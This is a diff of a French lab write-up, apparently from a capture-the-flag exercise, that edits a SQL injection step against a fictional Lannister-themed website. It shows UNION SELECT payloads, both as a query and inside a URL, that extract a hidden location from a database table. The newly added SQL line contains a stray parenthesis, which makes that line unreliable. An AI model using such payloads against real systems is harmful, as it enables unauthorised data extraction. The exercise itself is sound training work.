@@ -85,10 +85,10 @@ On trouve :
 
 ## Étape 5 : Extraire l'emplacement du Feu Grégoire
 ```sql
-' UNION SELECT type, CONCAT(ville,' ' ,emplacement) FROM+battle_ressources -- 
+' UNION SELECT type, emplacement) FROM battle_ressources -- 
 ```
 
-http://castral-roc.lannisport.south/famillelannister.php?member='+UNION+SELECT+type,+CONCAT(ville,'+',emplacement)+FROM+battle_ressources+--+
+http://castral-roc.lannisport.south/famillelannister.php?member='+UNION+SELECT+type,+emplacement+FROM+battle_ressources+--+
 
 On trouve alors : 
 
